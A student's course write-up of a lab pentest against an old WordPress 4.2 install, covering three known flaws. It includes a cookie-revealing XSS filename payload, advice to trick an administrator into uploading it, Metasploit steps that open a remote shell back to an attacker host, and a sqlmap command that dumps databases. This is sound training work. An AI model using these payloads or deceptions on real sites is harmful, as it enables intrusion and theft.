# cis221_codepath

See branches for assignments.

# Project 7 - WordPress Pentesting

Time spent: **25** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

### 1. CVE-2016-7168 -- WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename 
  - [ ] Summary: Cross-site scripting (XSS) vulnerability in the media_handle_upload function in wp-admin/includes/media.php in WordPress before 4.6.1 might allow remote attackers to inject arbitrary web script or HTML by tricking an administrator into uploading an image file that has a crafted filename. 
    - Vulnerability types: Cross-site scripting
    - Tested in version: WordPress 4.2
    - Fixed in version: WordPress 4.6.1
  - [ ] GIF Walkthrough: <img src="https://github.com/peelingwave/cis221_codepath/blob/Week-7%268-Project-Wordpress-Vs.-Kali/Pentest1-WP4.2-XSS_ImageUpload_exploit-marvin_codepath.gif" alt="Walkthrough" style="max-width: 100%;">
  - [ ] Steps to recreate: 
    1. Confirm WordPress target host is vulnerable. WP version must be 2.5-4.6.
    2. Create an image file and insert '<img src=a onerror=alert(document.cookie)>' into the filename. This is the paylod script that will cause a javascript alert. For example, I used "marvinc0d3p4th<img src=a onerror=alert(document.cookie)>.jpg"
    3. Use social engineering to have admin of target host to upload image file as an attachment page. Even better is if you can get the admin to use the created attachment page url to embed into a post. 
    <img src="https://github.com/peelingwave/cis221_codepath/blob/Week-7%268-Project-Wordpress-Vs.-Kali/Pentest1-WP4.2-XSS_ImageUpload_exploit-marvin_codepath.png">
  - [ ] Affected source code: (https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0)
  
Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html


### 2. CVE-2015-4133 -- WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit) 
  - [ ] Summary: This module exploits an arbitrary PHP code upload in the WordPress Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary file upload and remote code execution. 
    - Vulnerability types: Arbitrary file upload, remote code execution.
    - Tested in version: WordPress 4.2, ReFlex Gallery plugin 3.1.3 [reflex-gallery.3.1.3.zip](https://github.com/peelingwave/cis221_codepath/files/8492582/reflex-gallery.3.1.3.zip)
    - Fixed in version: ReFlex Gallery plugin 3.1.4
  - [ ] GIF Walkthrough: 
    ![WP_reflex_gallery_pwned](https://user-images.githubusercontent.com/98624766/163491702-53e1d5cb-5cbf-4be2-b410-b855596067fd.gif)
  - [ ] Steps to recreate: 
    1. Confirm WordPress target host is vulnerable. Reflex Gallery plugin version older than 3.1.4 must be installed and activated.
    2. Upload image into Reflex gallery plugin.
    3. In Reflex gallery settings retrieve the short code and insert it into post. 
    ![WP_reflex_gallery_pages](https://user-images.githubusercontent.com/98624766/163492792-0498b52d-a217-4414-9fbb-126535e69990.png)

    4. Run metasploit from attacker machine using the following commands:
        - sudo service postgresql start
        - sudo msfdb init
        - msfconsole
    5. in msfconsole shell, run the following commands to install the metasploit payload and create a connection with the target machine:
        - db_status
        - search Reflex #output should be: exploit/unix/webapp/wp_reflexgallery_file_upload
        - use exploit/unix/webapp/wp_reflexgallery_file_upload
        - info
        - set RHOST <url.of.target.machine>
        - set LHOST <url.of.attacker.machine>
        - exploit
    6. Meterpreter shell running, run the following commands to start a new shell inside the target machine:
        - shell
  
  - References:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4133


### 3. WordPress Olimometer 2.56 SQL Injection
  - [ ] Summary: WordPress Olimometer plugin versions 2.56 and below suffer from a remote SQL injection vulnerability.
    - Vulnerability types: SQLI
    - Tested in version: WP 4.2, Olimometer 2.56
    - Fixed in version: Olimometer 2.57
  - [ ] GIF Walkthrough: ![sqlmap-olimometer](https://user-images.githubusercontent.com/98624766/163496922-57763920-7a90-4562-be8e-2e5273c1307d.gif)

  - [ ] Steps to recreate: 
    1. Ensure WP 4.2 and install Olimometer 2.56 or older onto target machine and activate the plugin. [olimometer.2.56.zip](https://github.com/peelingwave/cis221_codepath/files/8492878/olimometer.2.56.zip)

    2. In Olimometer plugin settings, retrieve short code and insert into post. 
    ![olimometer_shortcode](https://user-images.githubusercontent.com/98624766/163495767-e013ea2b-952a-477a-87d1-d1059913cd6d.png)

    3. In attacker machine run sqlmap command:
       - sqlmap -u http://path.to.target.machine/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 --dbs --threads=5 --random-agent --no-cast

  - References: https://packetstormsecurity.com/files/139921/WordPress-Olimometer-2.56-SQL-Injection.html
  
### 4. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 5. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets


## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)


## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
